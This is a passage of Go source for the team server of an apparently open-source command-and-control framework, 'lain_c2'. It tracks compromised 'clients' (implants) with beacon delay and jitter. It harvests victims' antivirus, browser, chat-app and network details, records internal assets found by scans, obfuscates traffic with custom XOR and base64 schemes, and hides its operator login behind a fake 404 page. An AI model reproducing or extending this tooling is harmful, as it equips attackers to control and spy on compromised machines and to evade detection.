    // 9) 全局缓存
    mutex.Lock()
    sessionSlice = make([]string, 0)
    mutex.Unlock()

    // 9) 记录日志
    logStr := fmt.Sprintf(log_word["Memory_clean"])
    logger.WriteLog(logStr)
}

//查询内网资产
func getInnet(uid string,w http.ResponseWriter) {
	var list_innet []Innet
    dataInnetmu.RLock()
    defer dataInnetmu.RUnlock()
	for i := range data_innet.Innets {
        innet := &data_innet.Innets[i]
		if uid == innet.Uid {
			list_innet = append(list_innet, *innet)
		}
	}
	jsonData, err := json.Marshal(list_innet)
	if err != nil {
		http.Error(w,"json error", http.StatusInternalServerError)
		return
	}
	w.Header().Set("Content-Type", "application/json")
	w.Write(jsonData)
}
// obf const encry
type ObfConst struct {
	A byte // 0x6b
	B byte // 0x7a
	C byte // 0x5c
	D byte // 0xe4
	E byte // 0x3f
	F byte // 0xa5
}
func ObfuscateBySteps(data []byte, k ObfConst) []byte {
	if len(data) < 3 {
		return data
	}
	n := len(data) / 3
	if n < 2 {
		data[0] ^= k.A
		data[1] ^= k.B
		data[2] ^= k.C
		return data
	}
	at := func(r, c int) *byte {
		return &data[r*n+c]
	}
	for col := 1; col < n; col++ {
		colIndex := col + 1
		if colIndex%2 == 0 {
			*at(0, col) = (*at(0, col-1) | *at(0, col)) ^ k.A
			*at(2, col) = *at(1, col-1) ^ *at(2, col) ^ k.B
			*at(1, col) = *at(2, col-1) ^ *at(1, col) ^ k.C
		} else {
			*at(1, col) = (*at(0, col-1) ^ *at(1, col)) ^ k.D
			*at(0, col) = *at(1, col-1) ^ (*at(0, col) ^ k.E)
			*at(2, col) = (*at(2, col-1) | *at(2, col)) ^ k.F
		}
	}
	lastCol := n - 1
	*at(0, 0) = (*at(0, lastCol) | *at(0, 0)) ^ k.A
	*at(2, 0) = *at(1, lastCol) ^ *at(2, 0) ^ k.B
	*at(1, 0) = *at(2, lastCol) ^ *at(1, 0) ^ k.C
	return data
}
func randomSalt6() (ObfConst, []byte) {
	var s [6]byte
	_, _ = rand.Read(s[:])

	return ObfConst{
		A: s[0],
		B: s[1],
		C: s[2],
		D: s[3],
		E: s[4],
		F: s[5],
	}, s[:]
}
func Encrypt(plain, key []byte) []byte {
	if len(plain) == 0 || len(key) == 0 {
		return nil
	}
	obfKey, salt := randomSalt6()
	sin := (int(key[1024%len(key)])*len(plain) ^ 1024) % len(key)
	ofkey := append([]byte{}, key[sin:]...)
	fuscateKey := ObfuscateBySteps(ofkey, obfKey)
    if len(fuscateKey) == 0 {
        return nil
    }
	out := make([]byte, len(plain))
	for i := range plain {
		out[i] = plain[i] ^ fuscateKey[i%len(fuscateKey)]
	}
	return append(out, salt...)
}

func Decrypt(cipher, key []byte) []byte {
	if len(cipher) < 6 || len(key) == 0 {
		return nil
	}
	data := cipher[:len(cipher)-6]
	salt := cipher[len(cipher)-6:]
	obfKey := ObfConst{
		A: salt[0],
		B: salt[1],
		C: salt[2],
		D: salt[3],
		E: salt[4],
		F: salt[5],
	}
	sin := (int(key[1024%len(key)])*len(data) ^ 1024) % len(key)
	ofkey := append([]byte{}, key[sin:]...)
	fuscateKey := ObfuscateBySteps(ofkey, obfKey)
    if len(fuscateKey) == 0 {
        return nil
    }
	out := make([]byte, len(data))
	for i := range data {
		out[i] = data[i] ^ fuscateKey[i%len(fuscateKey)]
	}
	return out
}

// 文件加密
func Get_encry_f(data *[]byte, key *string) ([]byte, error) {
    return Encrypt(*data, []byte(*key)), nil
}
// 文件解密
func Get_decry_f(plain []byte, outputFile *os.File, key []byte) error {
    _, err := outputFile.Write(Decrypt(plain, key))
    return err
}
// 字符串解密
func Get_decry_s(input, key *string, decodeMap map[byte]int) string {
	data, err := customBase64Decode(*input, decodeMap)
	if err != nil {
		return ""
	}
	return string(Decrypt(data, []byte(*key)))
}
// 字符串加密
func Get_encry_s(input, key, base_rounds *string) string {
	return customBase64Encode(
		Encrypt([]byte(*input), []byte(*key)),
		*base_rounds,
	)
}

func generateRandomBase64Table() string {
	charset := []byte("ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789-_")
	rand.Seed(time.Now().UnixNano())
	rand.Shuffle(len(charset), func(i, j int) {
		charset[i], charset[j] = charset[j], charset[i]
	})
	return string(charset)
}
func buildDecodeMap(base_rounds string) map[byte]int {
	m := make(map[byte]int)
	for i := 0; i < len(base_rounds); i++ {
		m[base_rounds[i]] = i
	}
	return m
}
// 编码函数（无 padding）
func customBase64Encode(data []byte,base_rounds string) string {
    var buf bytes.Buffer
    length := len(data)
    for i := 0; i < length; i += 3 {
        remain := length - i
        var b1, b2, b3 byte
        b1 = data[i]
        if remain > 1 {
            b2 = data[i+1]
        }
        if remain > 2 {
            b3 = data[i+2]
        }
        val := uint32(b1)<<16 | uint32(b2)<<8 | uint32(b3)
        outCount := 4
        if remain == 1 {
            outCount = 2
        } else if remain == 2 {
            outCount = 3
        }
        for j := 0; j < outCount; j++ {
            index := (val >> uint(18-6*j)) & 0x3F
            buf.WriteByte(base_rounds[index])
        }
    }
    return buf.String()
}
// 解码函数（无 padding）
func customBase64Decode(s string, decodeMap map[byte]int) ([]byte, error) {
	var (
        val  uint32
        valb int
    )
    out := make([]byte, 0, len(s))
    for i := 0; i < len(s); i++ {
        v, ok := decodeMap[s[i]]
        if !ok {
            continue
        }
        val = (val << 6) | uint32(v)
        valb += 6
        if valb >= 8 {
            valb -= 8
            out = append(out, byte((val>>valb)&0xFF))
        }
    }
    return out,nil
}

/*结构体数据部分*/
//server插件结构体
type Plugin struct {
    Remark       string `json:"remark"`
    CodeWord   string `json:"codeWord"`
    Code       string `json:"code"`
    os         string `json:"os"`
    parameter  []string `json:"parameter"`
    ParameterDesc []string `json:"parameter_desc"`
}
type ServerPlugin struct {
    Plugins []Plugin `json:"servers"`
}
var server_plugin ServerPlugin
var serverPluginMu sync.RWMutex
//server结构体
type Server struct{
    Port       string `json:"port"`
    Path       string `json:"path"`
    ConnPath   string `json:"conn_path"`
    MsgPath    string `json:"msg_path"`
    SwitchPath string `json:"switch_path"`
    EncryPath  string `json:"encry_path"`
    DownloadPath  string `json:"download_path"`
    ResultPath string `json:"result_path"`
    NetPath   string `json:"net_path"`
    InfoPath   string `json:"info_path"`
    UploadPath string `json:"upload_path"`
    ListPath   string `json:"list_path"`
    OptionPath string `json:"option_path"`
    Protocol   string `json:"protocol"`
    CertPath   string `json:"certPath"`
    KeyPath    string `json:"keyPath"`
    Clients    int    `json:"clients"`
    User       string `json:"user"`
    Remark     string `json:"remark"`
    Uid        string `json:"uid"`
    Hostname   string `json:"hostname"`
    KeyPart    string `json:"keyPart"`
    Filekey    string `json:"filekey"`
    Group      string `json:"group"`
    WindowsPro string `json:"windows_pro"`
    BaseRounds string `json:"base_rounds"`
}
type Server_data struct{
    Servers []Server `json:"servers"`
}
var server_data Server_data 
var serverDataMu  sync.RWMutex
//用户结构体
type User struct{
	Username    string `json:"username"`
	Password    string   `json:"password"`
}
type Data_user struct{
	Users []User `json:"users"`
}
var data_user Data_user

//主机结构体
type Client struct {
	Username    string `json:"username"`
	Host        string `json:"host"`
	OS          string `json:"os"`
	Delay        int    `json:"Delay"`
    Jitter      int    `json:"jitter"`
    Executable string `json:"executable"`
	OnlineTime  string `json:"online_time"`
	ExternalIP     string `json:"external_ip"`
	LocalIP     string `json:"local_ip"`
	CurrentDir  string `json:"currentDir"`
	version     string `json:"version"`
	Remarks     string `json:"Remarks"`
	checkTime   string `json:"checkTime"`
	Uid         string `json:"uid"`
    Server      string `json:"server"`
}
type Data struct {
	Clients []Client `json:"clients"`
}
var client_data Data
var clientDataMu  sync.RWMutex

//主机结构体 - Windows专属扩展版本
type WindowsClient struct {
    Username    string `json:"username"`
    Host        string `json:"host"`
    OS          string `json:"os"`
    Delay       int    `json:"delay"`
    Jitter      int    `json:"jitter"`
    Executable  string `json:"executable"`
    OnlineTime  string `json:"online_time"`
    ExternalIP  string `json:"external_ip"`
    LocalIP     string `json:"local_ip"`
    CurrentDir  string `json:"currentDir"`
    Version     string `json:"version"`
    Remarks     string `json:"remarks"`
    CheckTime   string `json:"checkTime"`
    Uid         string `json:"uid"`
    Server      string `json:"server"`
    // Windows 专属字段
    MacAddresses string `json:"mac_addresses"`  // MAC地址
    CPUInfo      string `json:"cpu_info"`       // CPU信息
    Antivirus    string `json:"antivirus"`      // 杀毒软件
    Browsers     string `json:"browsers"`       // 浏览器信息
    ChatApps     string `json:"chat_apps"`      // 聊天应用
    MemoryInfo   string `json:"memory_info"`    // 内存使用情况
    SystemType   string `json:"system_type"`    // 系统类型
    Architecture string `json:"architecture"`   // 架构信息
}
type WindowsData struct {
    Clients []WindowsClient `json:"clients"`
}
// 全局 Windows 客户端数据
var windows_client_data WindowsData
var windows_clientMu sync.RWMutex

//get_conn结构体
type getConn struct{
	Username    string `json:"username"`
	Host        string `json:"host"`
	OnlineTime  string `json:"online_time"`
	HostKey     string `json:"host_key"`
	ShellIP     string `json:"shell_ip"`
	Uid         string `json:"uid"`
}
type Data_conn struct {
	Conns []getConn `json:"conns"`
}
var data_conn Data_conn
var dataConnMu sync.RWMutex

//内网资产结构体
type Innet struct {
    Uid    string   `json:"Uid"`
    IP           string   `json:"ip"`
    Target       string   `json:"target"`
    ShellInnet   []string `json:"shell_innet"`
}

type DataInnet struct {
    Innets []Innet `json:"innets"`
}
var data_innet DataInnet
var dataInnetmu sync.RWMutex

//操作人员聊天结构体
type Chat struct {
    Username string `json:"username"`
    Message  string `json:"message"`
    Time     string `json:"time"`
    Chatid   int `json:"chatid"`
    Type     string `json:"type"`
}
type Data_chat struct {
    Chats []Chat `json:"chats"`
}
var data_chat Data_chat
var dataChatmu sync.RWMutex

func put_innet(uid, target string, shell_innet []string) {
    var IP string
    clientDataMu.RLock()
    for i := range client_data.Clients {
        c := &client_data.Clients[i]
        if uid == c.Uid {
            IP = c.ExternalIP
            break
        }
    }
    clientDataMu.RUnlock()
    dataInnetmu.Lock()
    defer dataInnetmu.Unlock()
    for i := range data_innet.Innets {
        innet := &data_innet.Innets[i]
        if uid == innet.Uid && target == innet.Target {
            for _, v := range shell_innet {
                replaced := false
                for idx := range innet.ShellInnet {
                    if strings.HasPrefix(innet.ShellInnet[idx], v) {
                        innet.ShellInnet[idx] = v
                        replaced = true
                        break
                    }
                }
                if !replaced {
                    innet.ShellInnet = append(innet.ShellInnet, v)
                }
            }
            return
        }
    }
    newInnet := Innet{
        Uid:        uid,
        IP:         IP,
        Target:     target,
        ShellInnet: shell_innet,
    }
    data_innet.Innets = append(data_innet.Innets, newInnet)
}


// 辅助函数：检查切片中是否包含某个字符串
func contains(slice []string, item string) bool {
    for _, v := range slice {
        if v == item {
            return true
        }
    }
    return false
}

//写入链接结构体
func put_conn(username, host, online_time,uid,shell_ip,host_key string){
    dataConnMu.Lock()
    defer dataConnMu.Unlock()
	newConn := getConn{
        Username:   username,
        Host:       host,
        OnlineTime: online_time,
		HostKey:    host_key,
        ShellIP:    shell_ip,
		Uid:		uid,
    }
	for i := range data_conn.Conns {
        conn := &data_conn.Conns[i]
        if username == conn.Username && uid == conn.Uid {
            return
        }
    }
    data_conn.Conns = append(data_conn.Conns, newConn)
	log_str := fmt.Sprintf(log_word["request_host"],username, shell_ip, host, uid)
	logger.WriteLog(log_str)
}

type MyServer struct{}
func (s *MyServer) PutServer(
    port, path, connPath, msgPath,switch_key,encry_key,download,result,net,info,
    upload,list,option,protocol, username, remark string,
    certPEM, keyPEM,uid,hostname,keyPart,filekey,windows_pro,base_rounds string, clients int,
) bool {
    serverDataMu.Lock()
    defer serverDataMu.Unlock()
    for i := range server_data.Servers {
        server := &server_data.Servers[i]
        if server.Port == port && server.Protocol == protocol {
            log.Printf("Server with port %v and protocol %v already exists.\n", port, protocol)
            return false
        }
    }
    if remark == "" {
        remark = port + protocol
    }
    newServer := Server{
        Port:     port,
        Path:     path,
        ConnPath: connPath,
        MsgPath:  msgPath,
        SwitchPath: switch_key,
        EncryPath: encry_key,
        DownloadPath: download,
        ResultPath: result,
        NetPath: net,
        InfoPath: info,
        UploadPath: upload,
        ListPath: list,
        OptionPath: option,
        Protocol: protocol,
        CertPath: certPEM,
        KeyPath:  keyPEM,
        Clients:  clients,
        User: username,
        Remark:   remark,
        Uid:     uid,
        Hostname: hostname,
        KeyPart:  keyPart,
        Filekey:  filekey,
        WindowsPro: windows_pro,
        BaseRounds: base_rounds,
    }
    
    server_data.Servers = append(server_data.Servers, newServer)
    
    return true
}
// Windows 专属的写入主机结构体函数
func Windows_put_client(username, host, osType, online_time, shell_ip, currentDir, version, innet_ip, remarks, uid, server_remark, executable string, _delay, jitter int, macs, cpuInfo, antivirus, browsers, chatApps, memoryStr, systemType, arch string) {
    windows_clientMu.Lock()
    defer windows_clientMu.Unlock()
    newClient := WindowsClient{
        Username:     username,
        Host:         host,
        OS:           osType,
        Delay:        _delay,
        OnlineTime:   online_time,
        ExternalIP:   shell_ip,
        LocalIP:      innet_ip,
        CurrentDir:   currentDir,
        Version:      version,
        Remarks:      remarks,
        Uid:          uid,
        Server:       server_remark,
        Jitter:       jitter,
        Executable:   executable,
        // Windows 专属字段
        MacAddresses: macs,
        CPUInfo:      cpuInfo,
        Antivirus:    antivirus,
        Browsers:     browsers,
        ChatApps:     chatApps,
        MemoryInfo:   memoryStr,
        SystemType:   systemType,
        Architecture: arch,
    }

    for i := range windows_client_data.Clients {
        client := &windows_client_data.Clients[i]
        if username == client.Username && host == client.Host && uid == client.Uid {
            client.OnlineTime = online_time
            client.ExternalIP = shell_ip
            client.LocalIP    = innet_ip
            client.Delay      = _delay
            client.CurrentDir = currentDir
            client.Version    = version
            client.Remarks    = remarks
            client.CheckTime  = online_time
            client.Server     = server_remark
            client.Jitter     = jitter
            client.Executable = executable
            
            // 更新 Windows 专属字段
            client.MacAddresses = macs
            client.CPUInfo      = cpuInfo
            client.Antivirus    = antivirus
            client.Browsers     = browsers
            client.ChatApps     = chatApps
            client.MemoryInfo   = memoryStr
            client.SystemType   = systemType
            client.Architecture = arch
            
            return
        }
    }
    // 如果不存在，则添加新客户端
    windows_client_data.Clients = append(windows_client_data.Clients, newClient)
}
// 写入主机结构体
func put_client(username, host, osType, online_time, shell_ip,currentDir,version,innet_ip,Remarks,uid,server_remark,executable string, _delay,jitter int) {
    clientDataMu.Lock()
    defer clientDataMu.Unlock()
    newClient := Client{
        Username:   username,
        Host:       host,
        OS:         osType,
        Delay:       _delay,
        OnlineTime: online_time,
        ExternalIP:    shell_ip,
		LocalIP:    innet_ip,
		CurrentDir: currentDir,
		version:    version,
		Remarks:    Remarks,
		Uid:         uid,
        Server: server_remark,
        Jitter:     jitter,
        Executable: executable,
    }
	for i := range client_data.Clients {
        client := &client_data.Clients[i]
        if username == client.Username && host == client.Host && uid == client.Uid {
            client.OnlineTime = online_time
            client.ExternalIP = shell_ip
            client.LocalIP    = innet_ip
            client.Delay      = _delay
            client.CurrentDir = currentDir
            client.version    = version
            client.Remarks    = Remarks
            client.checkTime  = online_time
            client.Server     = server_remark
            client.Jitter     = jitter
            client.Executable = executable
            return
        }
    }
    client_data.Clients = append(client_data.Clients, newClient)
}
//读取结构体
func readJSONFile(fileName string, v interface{}) error {
    file, err := os.OpenFile(fileName, os.O_RDWR|os.O_CREATE, 0644)
    if err != nil {
        return fmt.Errorf("could not open file: %v", err)
    }
    defer file.Close()
    byteValue, err := ioutil.ReadAll(file)
    if err != nil {
        return fmt.Errorf("Failed to read file content: %v", err)
    }
    if len(byteValue) > 0 {
        err = json.Unmarshal(byteValue, v)
        if err != nil {
            return fmt.Errorf("Failed to parse JSON data: %v", err)
        }
    }
    return nil
}

/*结构体数据部分结束*/

func main(){
    Read_log_word()
    asciiArt := 
    `
                                ..                    .
                                x .d88"                @88>
                                5888R                 %8P      u.    u.
                                '888R         u        .     x@88k u@88c.
                                888R      us888u.   .@88u  ^"8888""8888"
                                888R   .@88 "8888" ''888E   8888  888R
                                888R   9888  9888    888E    8888  888R
                                888R   9888  9888    888E    8888  888R
                                888R   9888  9888    888E    8888  888R
                                .888B . 9888  9888    888&   "*88*" 8888"
                                ^*888%  "888*""888"   R888"    ""   'Y"            .....  ...₵Ø₦₦Ɇ₵₮ ɆVɆⱤ₮Ⱨł₦₲...  ....
                                "%     ^Y"   ^Y'     ""     
    source code from: https://github.com/Mazzy-Stars/lain_c2
    `
    // 查询用户结构体
    user_err := readJSONFile("user.json", &data_user)
    if user_err != nil {
        fmt.Println("Failed to read user data")
    }
    var index_port string
    var certPath string
    var keyPath string
    var useDefaultCert bool
    var css_file string
    var switch_http bool
    var ui_route string
    var web_route string

    var web_js string
    var web_css string

    // 读取命令行参数
    flag.StringVar(&index_port, "p", "443", "Port")
    flag.StringVar(&certPath, "cert", "", "Customize public key path")
    flag.StringVar(&keyPath, "key", "", "Customize private key path")
    flag.BoolVar(&useDefaultCert, "DefaultCert", false, "Use default public and private keys")
    flag.StringVar(&error_str, "resp-error", "404 page not found", "web error resp")
    flag.StringVar(&css_file, "css","", "Use default css file")
    flag.StringVar(&web_title, "title","connect", "web ui title")
    flag.BoolVar(&switch_http, "http", false, "Use HTTP instead of HTTPS")
    flag.StringVar(&ui_route, "ui-route", "server", "web ui route")
    flag.StringVar(&web_route, "web-route", "user_index", "backend communication routing")

    flag.StringVar(&web_js, "js-route", "lain.js", "customize web js")
    flag.StringVar(&web_css, "css-route", "lain.css", "customize web css")

    flag.Parse()
    if _, err := os.Stat("./html"); os.IsNotExist(err) {
        err := os.MkdirAll("./html", os.ModePerm)
        if err != nil {
            fmt.Println("[*] Unable to create directory ./html:", err)
            return
        }
        fmt.Println("[*] directory ./html Created successfully")
    }
    fs := http.FileServer(http.Dir("./html"))
    http.Handle("/", fs)
    fmt.Println(asciiArt)

    //登录
    http.Handle("/login", withCORS(login(ui_route, web_css)))

    //页面
    http.HandleFunc("/"+ui_route, func(w http.ResponseWriter, r *http.Request) {
        web_ui.Lain(error_str,web_title,web_js,web_css,web_route,sessionSlice).ServeHTTP(w, r)
    })

    //有权限交互
    http.Handle("/"+web_route, withCORS(User_index(web_route)))

    //调用js
    http.HandleFunc("/"+web_js, func(w http.ResponseWriter, r *http.Request) {
        web_ui.Js(error_str,web_route,web_js,web_css,sessionSlice).ServeHTTP(w, r)
    })

    //调用css
    http.HandleFunc("/"+web_css, func(w http.ResponseWriter, r *http.Request) {
        web_ui.Css(css_file,error_str).ServeHTTP(w, r)
    })

    // 创建 HTTP Server
    server := &http.Server{
        Addr:         ":" + index_port,
        Handler:      http.DefaultServeMux,
        IdleTimeout:  0,
        ReadTimeout:  30 * time.Second,
        WriteTimeout: 30 * time.Second,
    }

    if switch_http {
        // 使用 HTTP
        fmt.Printf("[*] Start HTTP server successful, access address http://localhost:%s/login\n", index_port)
        err := server.ListenAndServe()
        if err != nil {
            fmt.Printf("FAIL TO START HTTP SERVER %v\n", err)
        }
    } else {
        // 使用 HTTPS
        var cert tls.Certificate
        var err error
        if useDefaultCert || (certPath == "" && keyPath == "") {
            cert, err = tls.X509KeyPair([]byte(protocol.DefaultCert), []byte(protocol.DefaultKey))
            if err != nil {
                fmt.Printf("Failed to load default certificate: %v\n", err)
                return
            }
        } else if certPath != "" && keyPath != "" {
            cert, err = tls.LoadX509KeyPair(certPath, keyPath)
            if err != nil {
                fmt.Printf("[*] Failed to load custom certificate: %v\n", err)
                return
            }
        } else {
            flag.Usage()
            return
        }
        // 自定义 TLS 配置
        tlsConfig := &tls.Config{
            MinVersion:       tls.VersionTLS12,
            GetCertificate:   func(chi *tls.ClientHelloInfo) (*tls.Certificate, error) { return &cert, nil },
            ClientAuth:       tls.NoClientCert,
            InsecureSkipVerify: true,
        }
        server.TLSConfig = tlsConfig
        fmt.Printf("[*] Start HTTPS server successful, access address https://localhost:%s/login\n", index_port)
        err = server.ListenAndServeTLS("", "")
        if err != nil {
            fmt.Printf("FAIL TO START HTTPS SERVER %v\n", err)
        }
    }
}
func withCORS(next http.Handler) http.Handler {
    return http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
        // 1. 读取白名单
        whitelistIPs, err := readWhitelist()
        if err != nil {
            http.Error(w, "internal config error", http.StatusInternalServerError)
            return
        }
        clientIP := getClientIP(r)
        // 2. IP 白名单检查
        allowed := false
        for i := range whitelistIPs {
            if clientIP == whitelistIPs[i] || strings.HasPrefix(clientIP, whitelistIPs[i]) {
                allowed = true
                break
            }
        }
        // 如果 IP 不在白名单，直接拒绝
        if !allowed {
            w.WriteHeader(http.StatusNotFound)
            return
        }
        // 3. 【核心修改】：既然 IP 已允许，直接处理跨域
        origin := r.Header.Get("Origin")
        // 如果有 Origin，说明是跨域请求，直接镜像返回以允许跨域
        if origin != "" {
            w.Header().Set("Access-Control-Allow-Origin", origin)
            w.Header().Set("Access-Control-Allow-Credentials", "true")
        } else {
            // 如果是非浏览器请求（无 Origin），为了安全或兼容性，可设为 *
            // 但注意：设置了 Allow-Credentials 时，Origin 不能为 *
            w.Header().Set("Access-Control-Allow-Origin", "*")
        }
        // 4. 标准 CORS 响应头
        w.Header().Set("Access-Control-Allow-Methods", "GET, POST, PUT, DELETE, OPTIONS")
        // 注意：Headers 建议根据实际需要写，* 有时在带 Cookie 的请求中会有兼容性问题
        w.Header().Set("Access-Control-Allow-Headers", "Content-Type, Authorization, X-Requested-With")
        // 5. 处理预检请求 (Preflight)
        if r.Method == http.MethodOptions {
            w.WriteHeader(http.StatusNoContent)
            return
        }

        // 6. 放行
        next.ServeHTTP(w, r)
    })
}

func Read_log_word() {
    filePath := "word.json"
    // 默认内容（英文版）
    defaultContent := 
    `
    {
        "removed_agent": "Client [%s] has been removed",
        "stop_server": "There are implants on the listening server, cannot stop service",
        "removed_server": "Listening server [%s] has been removed",
        "no_found_server": "Listening server %s not found",
        "plugin_code": "Plugin code: %s, code: %s",
        "agent_online": "==== New client online ==== | User: %v | UID: %v | Host: %v | OS: %v | Shell Version: %v | Executable: %v | Delay: %v sec | Jitter: %v sec | Server IP: %v | Internal IP: %v | Port: %v | Protocol: %v | Server Remark: %v | Current Path: %v | Key Hash (partial): %v ====",
        "windows_agent_online": "==== New Windows client online | User: %v | UID: %v | Host: %v | OS: %v | Shell Version: %v | Executable: %v | Delay: %v sec | Jitter: %v sec | Server IP: %v | Internal IP: %v | Port: %v | Protocol: %v | Server Remark: %v | Current Path: %v | Key Hash (partial): %v | MAC: %v | CPU: %v | Memory: %v | System: %v | Arch: %v | Antivirus: %v | Browser: %v | Chat Software: %v ====",
        "change_file_time": "%v Changed file time: %s",
        "change_file_name": "%v Changed file name: %s",
        "result": "Host: %s [%s] received bytes: [*%d...]",
        "msg": "Send host %v message %v, %v",
        "scan_msg": "%v Scan host %s",
        "scan_result": "Host %s && %s received internal assets: [*%d...]",
        "download": "Host: [%s] file downloaded successfully: [%s]",
        "download_part": "Host: [%s] downloading file: [%s], length: %v, part: %v",
        "request_file": "Received a file upload request",
        "request_file_part": "Received file part: %s, size: %dMB",
        "request_file_part_": " ==== Received from user: %s, UID: %s, file: %s, part: %v, range: %d-%d",
        "web_upload": "%v key does not exist",
        "tmp_file": "%v failed to create temp file: %v",
        "write_tmp": "%v failed to write temp file: %v",
        "read_tmp": "%v failed to read temp file: %v",
        "encry_tmp_fail": "%v file encryption failed: %v",
        "encry_tmp": "%v file encrypted successfully (%d bytes): %v",
        "Memory_clean": "Memory cleaned successfully!",
        "request_host": "User request: Username: %v, IP: %v, Host: %v, UID: %v",
        "login_success": "User login successful, from %v, user: %v",
        "login_fail": "User login failed, from %v, wrong username or password, user: %v, password: %v",
        "http_server":"[*] Start HTTP server successful, access address :%s%s,Listeners_path:%s,Msg_path:%s,switch_path:%s,key_path:%s,download_path:%s,result_path:%s,net_path:%s,info_path:%s,upload_path:%s,list_path:%s,option:%s",
        "https_server":"[*] Start HTTPS server successful, access address :%s%s,Listeners_path:%s,Msg_path:%s,switch_path:%s,key_path:%s,download_path:%s,result_path:%s,net_path:%s,info_path:%s,upload_path:%s,list_path:%s,option:%s",
        "http_err":"FAIL TO START HTTP SERVER: %v",
        "https_err":"FAIL TO START HTTPS SERVER: %v",
        "cert_err":"[*] Failed to parse provided cert or key: %v",
        "provided_cert":"[*] Using provided certificate and key",
        "default_cert":"[*] Failed to parse default cert or key: %v",
        "chat_message":"[*] User: %s sent a chat: %s",
        "chat_file":"User: %s upload chat file: %s"
    }    
    `
    // 检查文件是否存在
    if _, err := os.Stat(filePath); os.IsNotExist(err) {
        // 文件不存在则写入默认内容
        err := os.WriteFile(filePath, []byte(defaultContent), 0644)
        if err != nil {
            fmt.Println("Failed to create word.json:", err)
            return
        }
    }
    file, err := os.Open(filePath)
    if err != nil {
        fmt.Println("can not open word.json:", err)
        return
    }
    defer file.Close()
    decoder := json.NewDecoder(file)
    err = decoder.Decode(&log_word)
    if err != nil {
        fmt.Println("can not read word.json:", err)
        return
    }
}
func readWhitelist() ([]string, error) {
    filePath := "white.config"
    // 检查文件是否存在
    if _, err := os.Stat(filePath); os.IsNotExist(err) {
        // 文件不存在则创建并写入默认内容
        err := os.WriteFile(filePath, []byte("127.0.0.1\n::1\n"), 0644)
        if err != nil {
            return nil, err
        }
    }
    file, err := os.Open(filePath)
    if err != nil {
        return nil, err
    }
    defer file.Close()
    var whitelist []string
    scanner := bufio.NewScanner(file)
    for scanner.Scan() {
        line := strings.TrimSpace(scanner.Text())
        if line != "" && !strings.HasPrefix(line, "//") {
            whitelist = append(whitelist, line)
        }
    }
    if err := scanner.Err(); err != nil {
        return nil, err
    }
    return whitelist, nil
}
//登录
func login(ui_route,web_css string) http.HandlerFunc {
    return func(w http.ResponseWriter, r *http.Request) {
        if r.Method == http.MethodGet {
            html := fmt.Sprintf(`<!DOCTYPE html>
            <html lang="en">
            <head>
                <meta charset="UTF-8">
                <meta name="viewport" content="width=device-width, initial-scale=1.0">
                <title>%s</title>
                <link rel="stylesheet" href="/`+web_css+`">
            </head>
            <body>
                <form class="form-in" action="/login" method="post" enctype="application/x-www-form-urlencoded">  
                    <h1>Login</h1>
                    <input type="text" name="username" id="username" placeholder="Username" required>
                    <input type="password" name="password" placeholder="password" required>
                    <button type="submit">Login</button>
                </form>
            </body>
            </html>`,web_title)
            w.Header().Set("Content-Type", "text/html")
            fmt.Fprint(w, html)
            return
        }
        if r.Method == http.MethodPost {
            // 解析表单数据
            err := r.ParseForm()
            if err != nil {
                w.WriteHeader(http.StatusNotFound)
                fmt.Fprint(w, error_str)
                return
            }
            username := r.FormValue("username")
            password := r.FormValue("password")
            userip := getClientIP(r)
            // 对用户名进行MD5加密并取前24位
            usernameHash := md5.New()
            usernameHash.Write([]byte(username))
            usernameHashBytes := usernameHash.Sum(nil)
            usernameHashString := hex.EncodeToString(usernameHashBytes)
            // 对密码进行MD5加密并取前24位
            passwordHash := md5.New()
            passwordHash.Write([]byte(password))
            passwordHashBytes := passwordHash.Sum(nil)
            passwordHashString := hex.EncodeToString(passwordHashBytes)
            user_err := readJSONFile("user.json", &data_user)
            if user_err != nil {
                w.WriteHeader(http.StatusNotFound)
                fmt.Fprint(w, error_str)
                return
            }
            var validUser bool

            mutex.Lock()
            defer mutex.Unlock()

            for i := range data_user.Users {
                user := &data_user.Users[i]
                if len(user.Username) < 24 || len(user.Password) < 24 {
                    continue
                }
                if usernameHashString[:24] == user.Username[:24] && 
                   passwordHashString[:24] == user.Password[:24] {
                    validUser = true
                    break
                }
            }
            if validUser {
                // 生成随机 Session 并绑定用户名
                randomValue := generateRandomString(32)
                cookie_value := randomValue + "=" + username
                cookie := http.Cookie{
                    Name:     "cookie",
                    Value:    cookie_value,
                    Path:     "/",
                    Expires:  time.Now().Add(6 * 30 * 24 * time.Hour), // 半年
                    Secure:   true,
                    HttpOnly: false,
                    SameSite: http.SameSiteNoneMode,
                }
                found := false
                for _, session := range sessionSlice {
                    if session == cookie_value {
                        found = true
                        break
                    }
                }
                // 如果不存在才添加
                if !found {
                    sessionSlice = append(sessionSlice, cookie_value)
                }
                log_str := fmt.Sprintf(log_word["login_success"], userip, username)
                logger.WriteLog(log_str)
                http.SetCookie(w, &cookie)
                http.Redirect(w, r, "/"+ui_route, http.StatusFound)
                json.NewEncoder(w).Encode(map[string]interface{}{
                    "code": "200",
                    "message": "Login successful",
                })
            } else {
                // 没有用户则
                log_str := fmt.Sprintf(log_word["login_fail"], userip, username, password)
                logger.WriteLog(log_str)
                json.NewEncoder(w).Encode(map[string]interface{}{
                    "code": "401",
                    "message": "Unauthorized",
                })
            }
        } else {
            w.WriteHeader(http.StatusNotFound)
            fmt.Fprint(w,error_str)
        }
    }
}
func generateRandomString(length int) string {
	bytes := make([]byte, length)
	_, err := rand.Read(bytes)
	if err != nil {
		log.Fatal(err)
	}
	return hex.EncodeToString(bytes)
}
